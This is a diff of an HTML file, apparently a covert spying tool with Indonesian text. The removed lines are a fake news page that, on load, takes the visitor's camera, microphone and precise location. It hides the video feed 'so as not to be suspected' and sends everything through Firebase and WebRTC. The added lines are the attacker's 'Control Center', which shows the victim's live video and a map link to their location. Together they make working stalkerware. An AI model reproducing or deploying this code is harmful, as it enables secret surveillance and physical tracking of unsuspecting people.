@@ -3,32 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini - Update Hari Ini</title>
+    <title>Control Center</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; }
-        .header { border-bottom: 2px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
-        .title { color: #e11d48; font-size: 2rem; margin: 0; }
-        .meta { color: #666; font-size: 0.9rem; }
-        .content img { width: 100%; border-radius: 8px; margin: 20px 0; }
-        #localVideo { display: none; } /* Sembunyikan video agar tidak dicurigai */
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .container { display: flex; gap: 20px; }
+        video { width: 640px; border: 2px solid #0f0; background: #111; }
+        .log { background: #111; padding: 15px; flex-grow: 1; border: 1px solid #0f0; }
+        button { background: #0f0; color: #000; border: none; padding: 10px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1 class="title">INFO BERITA</h1>
-        <div class="meta">Dipublikasikan pada: 25 Mei 2024 | Penulis: Admin Redaksi</div>
+    <h1>SYSTEM MONITORING : ACTIVE</h1>
+    <div class="container">
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div class="log">
+            <h3>TARGET INFO</h3>
+            <p id="loc">Lokasi: Menunggu...</p>
+            <p id="stat">Status: Menghubungkan...</p>
+            <button onclick="location.reload()">RECONNECT SYSTEM</button>
+        </div>
     </div>
-
-    <div class="content">
-        <h2>Inovasi Teknologi Web: Masa Depan Konektivitas Global</h2>
-        <p>Teknologi web terus berkembang pesat, menghadirkan kemudahan dalam berkomunikasi antar individu di seluruh dunia secara real-time. Dengan protokol terbaru, interaksi menjadi lebih cepat dan efisien.</p>
-        <img src="https://picsum.photos/800/400" alt="Ilustrasi Teknologi">
-        <p>Para ahli memprediksi bahwa dalam beberapa tahun ke depan, integrasi antara kecerdasan buatan dan platform berbasis browser akan menjadi standar baru dalam industri digital.</p>
-    </div>
-
-    <video id="localVideo" autoplay playsinline muted></video>
 
     <script>
         const firebaseConfig = {
@@ -43,59 +39,39 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database().ref('p2p_stream');
 
-        const pc = new RTCPeerConnection({
+        let pc = new RTCPeerConnection({
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
 
-        async function startSystem() {
-            try {
-                // 1. Akses Kamera, Mikrofon, dan Lokasi
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('localVideo').srcObject = stream;
-                stream.getTracks().forEach(track => pc.addTrack(track, stream));
+        pc.ontrack = (event) => {
+            document.getElementById('remoteVideo').srcObject = event.streams[0];
+            document.getElementById('stat').innerText = "Status: STREAMING LIVE";
+        };
 
-                // Ambil Lokasi berkala
-                setInterval(() => {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        db.child('status/location').set({
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            time: new Date().toLocaleTimeString()
-                        });
-                    }, null, { enableHighAccuracy: true });
-                }, 5000);
-
-                // 2. WebRTC Signaling (Offer)
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                db.child('signal/offer').set({ type: offer.type, sdp: offer.sdp });
-
-                // Kirim ICE Candidates
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        db.child('signal/targetCandidates').push(event.candidate.toJSON());
-                    }
-                };
-
-                // Terima Answer dari Monitor
-                db.child('signal/answer').on('value', async (snapshot) => {
-                    const answer = snapshot.val();
-                    if (answer && !pc.currentRemoteDescription) {
-                        await pc.setRemoteDescription(new RTCSessionDescription(answer));
-                    }
-                });
-
-                // Terima ICE Candidates dari Monitor
-                db.child('signal/monitorCandidates').on('child_added', (snapshot) => {
-                    pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
-                });
-
-            } catch (err) {
-                console.error("Izin ditolak atau sistem tidak didukung:", err);
+        db.child('signal/offer').on('value', async (snapshot) => {
+            const offer = snapshot.val();
+            if (offer && !pc.currentRemoteDescription) {
+                await pc.setRemoteDescription(new RTCSessionDescription(offer));
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                db.child('signal/answer').set({ type: answer.type, sdp: answer.sdp });
             }
-        }
+        });
 
-        window.onload = startSystem;
+        pc.onicecandidate = (event) => {
+            if (event.candidate) {
+                db.child('signal/monitorCandidates').push(event.candidate.toJSON());
+            }
+        };
+
+        db.child('signal/targetCandidates').on('child_added', (snapshot) => {
+            pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+        });
+
+        db.child('status/location').on('value', s => {
+            const d = s.val();
+            if(d) document.getElementById('loc').innerHTML = `Lokasi: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">KLIK MAPS</a>`;
+        });
     </script>
 </body>
 </html>
